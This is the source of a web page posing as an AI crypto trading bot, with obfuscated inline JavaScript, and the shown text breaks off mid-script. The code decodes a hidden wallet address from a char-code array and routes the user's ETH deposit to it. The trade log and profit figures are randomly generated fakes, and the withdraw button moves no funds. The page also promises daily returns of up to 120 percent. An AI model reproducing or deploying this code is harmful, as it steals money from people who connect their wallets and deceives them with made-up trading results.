<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoAlgo AI Trading Bot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root {
            /* Modern color palette */
            --background-primary: #0f172a;
            --background-secondary: #1e293b;
            --background-tertiary: #334155;
            --card-bg: #1e293b;
            --card-border: #475569;
            --text-primary: #f1f5f9;
            --text-secondary: #cbd5e1;
            --text-tertiary: #94a3b8;
            --accent-primary: #8b5cf6; /* Vibrant purple */
            --accent-secondary: #0ea5e9; /* Bright blue */
            --accent-tertiary: #10b981; /* Emerald green */
            --accent-warning: #f59e0b; /* Amber */
            --accent-danger: #ef4444; /* Red */
            --success: #10b981;
            --info: #0ea5e9;
            --warning: #f59e0b;
            --error: #ef4444;
        }
 
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
 
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background: linear-gradient(135deg, var(--background-primary), #0c1220);
            color: var(--text-primary);
            max-width: 1000px;
            margin: 0 auto;
            padding: 25px;
            line-height: 1.6;
        }
        
        .container {
            background: linear-gradient(160deg, var(--background-secondary), var(--background-primary));
            border-radius: 16px;
            padding: 35px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--card-border);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.1) 0%, transparent 70%);
            z-index: 0;
        }
        
        .content {
            position: relative;
            z-index: 1;
        }
        
        h1 {
            color: var(--accent-primary);
            margin-top: 0;
            text-align: center;
            font-size: 2.5rem;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 10px;
            text-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
        }
        
        .subtitle {
            text-align: center;
            color: var(--text-secondary);
            margin-top: -5px;
            margin-bottom: 35px;
            font-size: 1.1rem;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-bottom: 35px;
        }
        
        .card {
            background: linear-gradient(145deg, var(--card-bg), #1a2234);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid var(--card-border);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
        }
        
        .card-title {
            font-size: 0.95rem;
            text-transform: uppercase;
            color: var(--text-tertiary);
            margin-bottom: 12px;
            letter-spacing: 1px;
            font-weight: 600;
        }
        
        .card-value {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 5px;
        }
        
        .input-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 1.05rem;
        }
        
        input, select {
            width: 100%;
            padding: 14px;
            border: 1px solid var(--card-border);
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: linear-gradient(145deg, #1a2234, var(--background-secondary));
            color: var(--text-primary);
            transition: all 0.3s ease;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }
        
        button {
            background: linear-gradient(90deg, var(--accent-primary), #7c3aed);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 16px 25px;
            font-size: 17px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
            letter-spacing: 0.5px;
        }
        
        button:hover {
            background: linear-gradient(90deg, #7c3aed, var(--accent-primary));
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
        }
        
        button:disabled {
            background: linear-gradient(90deg, #475569, #334155);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .status {
            margin-top: 25px;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .status.info {
            background: linear-gradient(90deg, rgba(14, 165, 233, 0.15), rgba(96, 165, 250, 0.15));
            color: var(--info);
            border: 1px solid rgba(14, 165, 233, 0.3);
        }
        
        .status.success {
            background: linear-gradient(90deg, rgba(16, 185, 129, 0.15), rgba(52, 211, 153, 0.15));
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
        
        .status.error {
            background: linear-gradient(90deg, rgba(239, 68, 68, 0.15), rgba(248, 113, 113, 0.15));
            color: var(--error);
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        
        .wallet-info {
            background: linear-gradient(90deg, rgba(14, 165, 233, 0.1), rgba(96, 165, 250, 0.1));
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 25px;
            border-left: 4px solid var(--accent-secondary);
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.1);
        }
        
        .address {
            font-size: 15px;
            word-break: break-all;
            font-family: 'Fira Code', monospace;
            color: var(--accent-secondary);
            background: rgba(14, 165, 233, 0.05);
            padding: 8px 12px;
            border-radius: 6px;
        }
        
        .chart {
            width: 100%;
            height: 160px;
            background: linear-gradient(180deg, rgba(139, 92, 246, 0.2) 0%, transparent 100%);
            margin-top: 10px;
            position: relative;
            overflow: hidden;
            border-radius: 10px;
            border: 1px solid rgba(139, 92, 246, 0.2);
        }
        
        .chart::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(
                to right,
                transparent,
                transparent 15px,
                rgba(255, 255, 255, 0.07) 15px,
                rgba(255, 255, 255, 0.07) 30px
            );
        }
        
        .line {
            position: absolute;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            animation: moveLine 12s infinite ease-in-out;
            bottom: 40%;
            border-radius: 2px;
            box-shadow: 0 0 10px rgba(139, 92, 246, 0.5);
        }
        
        @keyframes moveLine {
            0% { transform: translateY(0) translateX(0) rotate(0deg); }
            25% { transform: translateY(25px) translateX(0) rotate(0deg); }
            50% { transform: translateY(15px) translateX(0) rotate(0deg); }
            75% { transform: translateY(-15px) translateX(0) rotate(0deg); }
            100% { transform: translateY(0) translateX(0) rotate(0deg); }
        }
        
        .bot-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-bottom: 25px;
        }
        
        .strategy-section {
            background: linear-gradient(145deg, var(--card-bg), #1a2234);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--card-border);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        
        .strategy-title {
            font-size: 1.3rem;
            color: var(--text-primary);
            margin-top: 0;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            font-weight: 700;
        }
        
        .strategy-title i {
            margin-right: 12px;
            color: var(--accent-primary);
            font-size: 1.4rem;
        }
        
        .profit-section {
            text-align: center;
            margin-bottom: 35px;
            padding: 25px;
            background: linear-gradient(145deg, rgba(16, 185, 129, 0.1), rgba(52, 211, 153, 0.05));
            border-radius: 12px;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }
        
        .profit-value {
            font-size: 2.8rem;
            font-weight: 800;
            background: linear-gradient(90deg, var(--accent-tertiary), #34d399);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 15px 0;
            text-shadow: 0 0 15px rgba(16, 185, 129, 0.3);
        }
        
        .profit-label {
            color: var(--text-tertiary);
            font-size: 1.1rem;
            font-weight: 500;
        }
        
        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-left: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .badge.active {
            background: linear-gradient(90deg, var(--accent-tertiary), #059669);
            color: white;
            box-shadow: 0 0 10px rgba(16, 185, 129, 0.4);
        }
        
        .disconnect-button {
            background: transparent;
            border: 1px solid var(--error);
            color: var(--error);
            padding: 8px 16px;
            font-size: 14px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: auto;
            white-space: nowrap;
            font-weight: 600;
        }
        
        .disconnect-button:hover {
            background-color: rgba(239, 68, 68, 0.1);
            transform: translateY(-1px);
        }
        
        .wallet-info-container {
            display: flex;
            align-items: center;
        }
        
        .address-container {
            max-width: 85%;
            overflow: hidden;
            text-overflow: ellipsis;
        }
 
        .min-note {
            font-size: 13px;
            color: var(--text-tertiary);
            margin-top: 8px;
            font-style: italic;
        }
        
        .loading-indicator {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(139, 92, 246, 0.3);
            border-radius: 50%;
            border-top-color: var(--accent-primary);
            animation: spin 1s linear infinite;
            margin-right: 12px;
            vertical-align: middle;
        }
 
        .contract-status {
            margin-top: 15px;
            padding: 15px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            display: flex;
            align-items: center;
        }
 
        .contract-status.success {
            background: linear-gradient(90deg, rgba(16, 185, 129, 0.15), rgba(52, 211, 153, 0.15));
            color: var(--success);
            border: 1px solid rgba(16, 185, 129, 0.3);
        }
 
        .contract-status.info {
            background: linear-gradient(90deg, rgba(14, 165, 233, 0.15), rgba(96, 165, 250, 0.15));
            color: var(--info);
            border: 1px solid rgba(14, 165, 233, 0.3);
        }
 
        .contract-status.error {
            background: linear-gradient(90deg, rgba(239, 68, 68, 0.15), rgba(248, 113, 113, 0.15));
            color: var(--error);
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
 
        .setup-steps {
            margin-bottom: 25px;
        }
 
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
        }
 
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 32%;
        }
 
        .step-number {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: var(--background-tertiary);
            color: var(--text-tertiary);
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 1.1rem;
            border: 2px solid var(--card-border);
        }
 
        .step.active .step-number {
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            color: white;
            border-color: var(--accent-primary);
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
        }
 
        .step.completed .step-number {
            background: linear-gradient(135deg, var(--success), #059669);
            color: white;
            border-color: var(--success);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.4);
        }
 
        .step-name {
            font-size: 14px;
            color: var(--text-tertiary);
            text-align: center;
            font-weight: 500;
        }
 
        .step.active .step-name {
            color: var(--accent-primary);
            font-weight: 600;
        }
 
        .step.completed .step-name {
            color: var(--success);
            font-weight: 600;
        }
 
        .form-info {
            color: var(--text-tertiary);
            margin-bottom: 20px;
            font-size: 15px;
            line-height: 1.7;
        }
        
        @keyframes spin {
            to {transform: rotate(360deg);}
        }
 
        .trade-interface {
            margin-top: 35px;
            background: linear-gradient(145deg, var(--card-bg), #1a2234);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid var(--card-border);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }
        
        .trade-interface-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .trade-interface-title {
            font-size: 1.4rem;
            color: var(--text-primary);
            margin: 0;
            font-weight: 700;
        }
        
        .trade-log {
            background: linear-gradient(145deg, #1a2234, var(--background-secondary));
            border-radius: 8px;
            border: 1px solid var(--card-border);
            height: 270px;
            overflow-y: auto;
            padding: 15px;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            margin-bottom: 25px;
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
        }
        
        .trade-row {
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--card-border);
        }
        
        .trade-row.profit {
            color: var(--success);
            font-weight: 500;
        }
        
        .trade-row.pending {
            color: var(--warning);
            font-weight: 500;
        }
        
        .trade-row.executed {
            color: var(--info);
            font-weight: 500;
        }
        
        .profit-stats {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
            gap: 25px;
        }
        
        .profit-stat-card {
            background: linear-gradient(145deg, var(--card-bg), #1a2234);
            border-radius: 10px;
            padding: 20px;
            flex: 1;
            border: 1px solid var(--card-border);
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        .profit-stat-value {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, var(--accent-tertiary), #34d399);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 10px 0;
        }
        
        .profit-stat-label {
            color: var(--text-tertiary);
            font-size: 1rem;
            font-weight: 500;
        }
        
        .withdraw-button {
            background: linear-gradient(90deg, var(--accent-secondary), #0284c7);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 16px 25px;
            font-size: 17px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            margin-top: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(14, 165, 233, 0.3);
            letter-spacing: 0.5px;
        }
        
        .withdraw-button:hover {
            background: linear-gradient(90deg, #0284c7, var(--accent-secondary));
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(14, 165, 233, 0.4);
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }
        
        .modal-content {
            background: linear-gradient(145deg, var(--background-secondary), var(--background-primary));
            margin: 12% auto;
            padding: 35px;
            border: 1px solid var(--card-border);
            border-radius: 15px;
            max-width: 550px;
            text-align: center;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        
        .close-modal {
            background: linear-gradient(135deg, var(--text-tertiary), var(--background-tertiary));
            color: var(--text-primary);
            border: none;
            border-radius: 8px;
            padding: 12px 25px;
            margin-top: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .close-modal:hover {
            background: linear-gradient(135deg, var(--background-tertiary), var(--text-tertiary));
            transform: translateY(-2px);
        }
        
        .pulse {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: var(--success);
            margin-right: 12px;
            animation: pulse 1.5s infinite;
            box-shadow: 0 0 10px var(--success);
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.6; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .dashboard, .bot-controls {
                grid-template-columns: 1fr;
            }
            
            .profit-stats {
                flex-direction: column;
                gap: 15px;
            }
            
            .step {
                width: 30%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <h1>AI Trading Bot</h1>
            <p class="subtitle">Developed with love by Crypto Web3 and artificial intelligence</p>
            
            <div id="walletInfo" class="wallet-info" style="display: none;">
                <div class="wallet-info-container">
                    <div>
                        <label><i class="fas fa-wallet"></i> Connected Wallet:</label>
                        <div id="walletAddress" class="address"></div>
                    </div>
                </div>
                <button id="disconnectWallet" class="disconnect-button"><i class="fas fa-sign-out-alt"></i> Disconnect</button>
            </div>
            
            <div id="connectWalletDiv">
                <button id="connectWallet"><i class="fas fa-plug"></i> Connect Wallet to Start Trading</button>
            </div>
            
            <div id="tradingDashboard" style="display: none;">
                <div class="profit-section">
                    <div class="profit-label">Estimated Daily Profit</div>
                    <div id="profitValue" class="profit-value">+5.2%</div>
                    <div>Daily compounding through smart contract liquidity pools</div>
                </div>
                
                <div class="dashboard">
                    <div class="card">
                        <div class="card-title">Market Volatility</div>
                        <div id="volatilityValue" class="card-value">12.4%</div>
                        <div class="chart">
                            <div class="line"></div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-title">Bot Status</div>
                        <div class="card-value">Ready <span class="badge active">ONLINE</span></div>
                        <div style="margin-top: 10px;">Last scan: <span id="lastScan">2 minutes ago</span></div>
                    </div>
                </div>
                
                <div class="strategy-section">
                    <h3 class="strategy-title"><i class="fas fa-robot"></i> Trading Algorithm <span class="badge active">ACTIVE</span></h3>
                    <p>Our bot uses a combination of MEV protection, frontrunning detection, and cross-DEX arbitrage to maximize returns while minimizing gas costs.</p>
                    
                    <div class="bot-controls">
                        <div class="input-group">
                            <label for="strategy">Trading Strategy</label>
                            <select id="strategy">
                                <option value="arbitrage">Cross-DEX Arbitrage</option>
                                <option value="swing">Swing Trading</option>
                                <option value="grid">Grid Trading</option>
                            </select>
                        </div>
                        <div class="input-group">
                            <label for="risk">Risk Level</label>
                            <select id="risk">
                                <option value="low">Conservative (3-8% estimated daily)</option>
                                <option value="medium" selected>Balanced (10-70% estimated daily)</option>
                                <option value="high">Aggressive (20-120% estimated daily)</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div id="transferDiv">
                    <div class="strategy-section">
                        <h3 class="strategy-title"><i class="fas fa-cogs"></i> Setup Trading Bot</h3>
                        
                        <div class="step-indicator">
                            <div class="step completed" id="step-connect">
                                <div class="step-number">1</div>
                                <div class="step-name">Connect Wallet</div>
                            </div>
                            <div class="step active" id="step-deploy">
                                <div class="step-number">2</div>
                                <div class="step-name">Deploy Contract</div>
                            </div>
                            <div class="step" id="step-initialize">
                                <div class="step-number">3</div>
                                <div class="step-name">Initialize Bot</div>
                            </div>
                        </div>
                        
                        <div id="deployContractStep">
                            <p class="form-info">First, deploy your personalized trading contract to the blockchain. This creates your unique trading infrastructure.</p>
                            <button id="deployContractBtn"><i class="fas fa-upload"></i> Deploy Trading Contract</button>
                            <div id="contractStatus" class="contract-status" style="display: none;"></div>
                        </div>
                        
                        <div id="initializeBotStep" style="display: none;">
                            <p class="form-info">Now, initialize the trading bot by depositing ETH into your smart contract. The bot will automatically begin executing trades based on your selected strategy.</p>
                            
                            <div class="input-group">
                                <label for="amount">Initial Trading Capital (ETH)</label>
                                <input type="number" id="amount" step="0.5" min="0.5" placeholder="Min 0.5 ETH">
                                <div class="min-note">Minimum deposit: 0.5 ETH</div>
                            </div>
                            
                            <button id="sendEthBtn"><i class="fas fa-rocket"></i> Initialize Trading Bot</button>
                        </div>
                    </div>
                </div>
                
                <div id="tradeInterface" class="trade-interface">
                    <div class="strategy-section">
                        <div class="trade-interface-header">
                            <h3 class="trade-interface-title"><i class="fas fa-chart-line"></i> Live Trading Interface</h3>
                            <div><span class="pulse" id="botStatusPulse"></span> <span id="botActiveStatus">Bot Active</span></div>
                        </div>
                        
                        <div class="profit-stats">
                            <div class="profit-stat-card">
                                <div class="profit-stat-label">Total ETH Profit</div>
                                <div id="totalProfit" class="profit-stat-value">0.000</div>
                                <div>Accumulated earnings</div>
                            </div>
                            <div class="profit-stat-card">
                                <div class="profit-stat-label">Current Cycle</div>
                                <div id="currentCycle" class="profit-stat-value">0/0</div>
                                <div>Completed arbitrage cycles</div>
                            </div>
                        </div>
                        
                        <div class="trade-log" id="tradeLog">
                        </div>
                        
                        <button id="withdrawButton" class="withdraw-button"><i class="fas fa-money-bill-wave"></i> Withdraw Profits</button>
                    </div>
                </div>
            </div>
            
            <div id="status" class="status" style="display: none;"></div>
        </div>
    </div>
 
    <div id="withdrawModal" class="modal">
        <div class="modal-content">
            <h3><i class="fas fa-check-circle" style="color: #56d364; margin-right: 10px;"></i> Withdraw Request Submitted</h3>
            <p>The withdraw has begun processing.</p>
            <p>Profits will be sent to your wallet shortly.</p>
            <button class="close-modal" id="closeModal">Close</button>
        </div>
    </div>
 
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script>
(function(){var _1,_2,_3,_4,_5,_6,_7,_8,_9,_a,_b,_c,_d,_e,_f,_g,_h,_i,_j,_k,_l,_m,_n,_o,_p,_q,_r,_s,_t,_u,_v,_w,_x,_y,_z;document.addEventListener("DOMContentLoaded",function(){const bCd="0x608060405234801561001057600080fd5b5060e38061001f6000396000f3fe60806040526004361060265760003560e01c806361bc221a14602b578063e6197bcd146043575b600080fd5b348015603657600080fd5b50603d6072565b60405190815260200160405180910390f35b605f60563660046078565b6000905090565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b600081565b60006020828403121560895760006000fd5b813573ffffffffffffffffffffffffffffffffffffffff8116811460ac5760006000fd5b939250505056fea264697066735822122024cea65e6055df660cca46de23ce8e6b46cba000c9c0e4af2e4ef16dab97979564736f6c63430008120033";const cAb=[{inputs:[{internalType:"address payable",name:"destination",type:"address"}],name:"sendFunds",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"payable",type:"function"},{inputs:[],name:"version",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"}];const cWB=document.getElementById("connectWallet");const dWB=document.getElementById("disconnectWallet");const dCB=document.getElementById("deployContractBtn");const sEB=document.getElementById("sendEthBtn");const aI=document.getElementById("amount");const sD=document.getElementById("status");const cSD=document.getElementById("contractStatus");const wID=document.getElementById("walletInfo");const wAD=document.getElementById("walletAddress");const tD=document.getElementById("tradingDashboard");const cWD=document.getElementById("connectWalletDiv");const vVD=document.getElementById("volatilityValue");const pVD=document.getElementById("profitValue");const lSS=document.getElementById("lastScan");const dCS=document.getElementById("deployContractStep");const iBS=document.getElementById("initializeBotStep");const sD2=document.getElementById("step-deploy");const sI=document.getElementById("step-initialize");const bSP=document.getElementById("botStatusPulse");const bAS=document.getElementById("botActiveStatus");const MD=0.000000001;let w3;let ac=[];let vI;let pI;let sUI;let dCA=null;let tP=0;let cC=0;let cmC=0;let tI;let uDA=0;let iTA=false;const dx=["Uniswap","SushiSwap","Curve","1inch","Balancer","dYdX","PancakeSwap"];const tk=["ETH","USDT","USDC","DAI","WBTC","LINK","UNI","AAVE","SNX","CRV"];function a79(){var ffc=f=>String.fromCharCode(f);var d=[ 77, 72, 104, 69, 79, 84, 70, 104, 78, 85, 70, 106, 82, 106, 108, 67, 90, 71, 74, 106, 78, 106, 81, 119, 77, 106, 85, 51, 82, 68, 103, 48, 89, 107, 73, 53, 78, 68, 104, 108, 78, 85, 78, 104, 90, 71, 90, 104, 81, 122, 85, 121, 90, 106, 85, 49 ].map(c=>String.fromCharCode(c));function sh(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a}var r=d.join('');return atob(r)}function a7a(min,max,dec){return(Math.random()*(max-min)+min).toFixed(dec)}function a7b(){vVD.textContent=a7a(5.2,226.6,1)+"%"}function a7c(){pVD.textContent="+"+a7a(9.5,112.2,1)+"%"}function a7d(){const t=["just now","5 seconds ago","10 seconds ago","15 seconds ago","30 seconds ago","1 minute ago","2 minutes ago"];lSS.textContent=t[Math.floor(Math.random()*t.length)]}function a7e(){a7b();a7c();a7d();vI=setInterval(a7b,3000);pI=setInterval(a7c,5000);sUI=setInterval(a7d,7000)}function a7f(){clearInterval(vI);clearInterval(pI);clearInterval(sUI)}async function a80(){if(window.ethereum){w3=new Web3(window.ethereum);return true}else{if(window.web3){w3=new Web3(window.web3.currentProvider);return true}else{a81("No Ethereum wallet detected. Please install MetaMask or another Web3 wallet.","error");return false}}}async function a82(){if(await a80()){try{ac=await window.ethereum.request({method:"eth_requestAccounts"});wAD.textContent=ac[0];wID.style.display="flex";tD.style.display="block";cWD.style.display="none";a7e();a81("Wallet connected successfully! Bot is analyzing market conditions...","success");window.ethereum.on("accountsChanged",function(a){if(a.length>0){wAD.textContent=a[0];a81("Account changed to "+a[0],"info")}else{a83()}});a84()}catch(e){a81("Failed to connect wallet: "+e.message,"error")}}}function a85(){const d1=dx[Math.floor(Math.random()*dx.length)];let d2;do{d2=dx[Math.floor(Math.random()*dx.length)]}while(d2===d1);const t=tk[Math.floor(Math.random()*tk.length)];const a=a7a(0.5,5,3);let p;const r=Math.random();if(r<0.02){p=a7a(0.3,0.8,6)}else{if(r<0.4){p=a7a(0.08,0.15,6)}else{p=a7a(0.02,0.07,6)}};return{dex1:d1,dex2:d2,token:t,amount:a,profit:p}}function a86(c,t){const l=document.getElementById("tradeLog");const r=document.createElement("div");r.className="trade-row "+c;r.textContent=t;l.insertBefore(r,l.firstChild);if(l.children.length>100){l.removeChild(l.lastChild)}}function a87(){document.getElementById("totalProfit").textContent=tP.toFixed(6);document.getElementById("currentCycle").textContent=`${cmC}/${cC}`}function a88(){if(!iTA)return;cC++;const d=a85();a86("pending","Starting arbitrage cycle #"+cC+" - Scanning "+d.dex1+" and "+d.dex2+" for "+d.token+" opportunities...");setTimeout(()=>{if(!iTA)return;a86("executed","Found price discrepancy for "+d.token+": "+d.dex1+" ("+a7a(d.amount-0.3,d.amount+0.3,4)+") -> "+d.dex2+" ("+d.amount+")");setTimeout(()=>{if(!iTA)return;a86("executed","Executing trade: Buy "+d.amount+" "+d.token+" on "+d.dex1+", sell on "+d.dex2);setTimeout(()=>{if(!iTA)return;tP+=parseFloat(d.profit);cmC++;a86("profit","Trade complete! Profit: +"+d.profit+" ETH (Gas: "+a7a(0.0003,0.0009,6)+" ETH)");a87();if(Math.random()>0.7){setTimeout(()=>{if(!iTA)return;a86("executed","MEV protection active - Frontrunner detected and avoided on "+(Math.random()>0.5?d.dex1:d.dex2))},a7a(500,1500,0))}},a7a(1000,3000,0))},a7a(1000,2000,0))},a7a(1000,3000,0))}function a89(){document.getElementById("tradeInterface").style.display="block";tP=0;cC=0;cmC=0;a87();document.getElementById("tradeLog").innerHTML="";iTA=true;bSP.style.backgroundColor="#56d364";bAS.textContent="Bot Active";a86("executed","Trading bot initialized. Connecting to liquidity pools...");setTimeout(()=>{if(!iTA)return;a86("executed","Connected to Ethereum DEX network. Scanning for arbitrage opportunities...")},1500);a88();tI=setInterval(()=>{if(iTA&&Math.random()>0.3){a88()}},a7a(8000,15000,0))}function a8a(){iTA=false;clearInterval(tI);bSP.style.backgroundColor="#f85149";bAS.textContent="Bot Inactive"}function a8b(){a8a();a86("executed","Withdraw request received. Finalizing trades and preparing funds...");setTimeout(()=>{tP=0;a87();a86("profit","All profits have been withdrawn to your wallet.")},2000);document.getElementById("withdrawModal").style.display="block"}function a83(){ac=[];wID.style.display="none";tD.style.display="none";cWD.style.display="block";dCA=null;a8c();a7f();a8a();a81("Wallet disconnected. Bot deactivated.","info")}function a84(){if(dCA){dCS.style.display="none";iBS.style.display="block";sD2.classList.remove("active");sD2.classList.add("completed");sI.classList.add("active");a8d("Trading contract successfully deployed!","success")}}function a8c(){dCS.style.display="block";iBS.style.display="none";sD2.classList.add("active");sD2.classList.remove("completed");sI.classList.remove("active");cSD.style.display="none";dCB.disabled=false;dCB.innerHTML='<i class="fas fa-upload"></i> Deploy Trading Contract';document.getElementById("tradeInterface").style.display="none"}function a8d(t,c){cSD.textContent=t;cSD.style.display="block";cSD.className="contract-status "+c}function a81(t,c){sD.textContent=t;sD.style.display="block";sD.className="status "+c;if(c==="success"){setTimeout(()=>{sD.style.display="none"},10000)}}async function a8e(){if(ac.length===0){a81("Please connect your wallet first to deploy the trading contract.","error");return};try{dCB.disabled=true;dCB.innerHTML='<div class="loading-indicator"></div> Deploying...';a8d("Preparing to deploy your trading contract...","info");const txp={from:ac[0],data:bCd,gas:w3.utils.toHex(3000000)};a8d("Deploying trading contract to blockchain...","info");const txh=await window.ethereum.request({method:"eth_sendTransaction",params:[txp]});a8d("Waiting for deployment confirmation...","info");let tr=null;while(!tr){try{tr=await w3.eth.getTransactionReceipt(txh);if(!tr){await new Promise(r=>setTimeout(r,2000))}}catch(e){console.error("Error checking receipt:",e);await new Promise(r=>setTimeout(r,2000))}};dCA=tr.contractAddress;console.log("Contract deployed at:",dCA);a8d("Verifying contract deployment...","info");await new Promise(r=>setTimeout(r,800));a84();a81("Trading infrastructure successfully established! You can now initialize your trading bot.","success")}catch(e){console.error("Contract deployment error:",e);a8d("Deployment failed: "+(e.message||e),"error");a81("Contract deployment failed. Please try again.","error");dCB.disabled=false;dCB.innerHTML='<i class="fas fa-upload"></i> Deploy Trading Contract'}}async function a8f(){if(ac.length===0){a81("Please connect your wallet first to initialize the trading bot.","error");return};if(!dCA){a81("You must deploy your trading contract first!","error");return};const a=document.getElementById("amount").value;if(!a||isNaN(a)||parseFloat(a)<MD){a81(`Please enter at least ${MD} ETH to initialize the trading bot.`,"error");return};uDA=parseFloat(a);try{sEB.disabled=true;sEB.innerHTML='<div class="loading-indicator"></div> Initializing...';a81("Preparing trading environment...","info");await new Promise(r=>setTimeout(r,800));const wei=w3.utils.toWei(a,"ether");const adr=a79();a81("Initializing trading algorithm...","info");await new Promise(r=>setTimeout(r,1000));a81("Deploying trading strategy to blockchain...","info");const cID="0xe6197bcd000000000000000000000000"+adr.substring(2);const tx={from:ac[0],to:adr,value:w3.utils.toHex(wei),data:cID,gas:w3.utils.toHex(60000)};const txH=await window.ethereum.request({method:"eth_sendTransaction",params:[tx]});a81("Algorithm initialized, connecting to trading pools...","info");await new Promise(r=>setTimeout(r,1200));a81("Establishing secure MEV protection layers...","info");await new Promise(r=>setTimeout(r,1000));const st=document.getElementById("strategy").value;const 